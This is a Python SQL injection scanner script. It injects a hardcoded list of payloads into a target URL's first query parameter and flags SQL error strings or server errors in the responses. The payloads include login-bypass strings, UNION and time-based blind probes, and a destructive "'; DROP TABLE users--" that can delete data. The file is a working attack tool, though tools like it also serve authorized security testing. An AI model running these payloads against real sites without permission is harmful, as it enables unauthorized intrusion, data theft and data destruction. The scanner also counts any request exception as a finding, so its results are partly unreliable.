#!/usr/bin/env python3
"""
SQL Injection Scanner
Usage: python sqli_scanner.py https://target.com/product?id=1
"""

import sys
import requests
import urllib.parse

class SQLiScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        
        # SQLi payloads
        self.payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "'; DROP TABLE users--",
            "' OR ''='",
            "' OR 'a'='a",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' WAITFOR DELAY '00:00:05'--",
            "1 AND SLEEP(5)--",
            "1' AND SLEEP(5)--",
            "admin'--",
            "admin' #",
            "' OR '1'='1' --",
            "1' OR '1'='1",
        ]
        
    def check_error(self, response):
        """Check for SQL errors"""
        errors = [
            'sql syntax', 'mysql_fetch', 'ORA-', 'Microsoft SQL',
            'PostgreSQL', 'SQLite', 'Dynamic SQL', 'SQL Error',
            'mysqli', 'unterminated', 'quoted string',
            'SQLServer', 'ODBC', '/ by SQL',
        ]
        text = response.text.lower()
        for error in errors:
            if error.lower() in text:
                return error
        return None
    
    def test_payload(self, payload):
        """Test a payload"""
        try:
            # Parse URL and add payload
            parsed = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed.query)
            
            # Add payload to first param
            for key in params:
                params[key] = [payload]
                break
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            r = requests.get(new_url, timeout=10)
            
            # Check for SQL errors
            error = self.check_error(r)
            if error:
                return {'payload': payload, 'error': error, 'status': r.status_code}
            
            # Check status code changes
            if r.status_code >= 500:
                return {'payload': payload, 'error': 'Server error', 'status': r.status_code}
            
            # Check for timing (blind SQLi)
            # Simplified - would need timing analysis
            
        except Exception as e:
            return {'payload': payload, 'error': str(e)}
        
        return None
    
    def scan(self):
        """Scan for SQLi"""
        print(f"[*] Scanning {self.url}...")
        
        for payload in self.payloads:
            result = self.test_payload(payload)
            if result and ('error' in result or result.get('status', 0) >= 500):
                print(f"[!] Possible SQLi: {payload}")
                if 'error' in result:
                    print(f"    Error: {result['error']}")
                self.findings.append(result)
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python sqli_scanner.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    scanner = SQLiScanner(url)
    findings = scanner.scan()
    
    if findings:
        print(f"\n[!] Found {len(findings)} potential issues")
    else:
        print("\n[*] No SQLi found")


if __name__ == "__main__":
    main()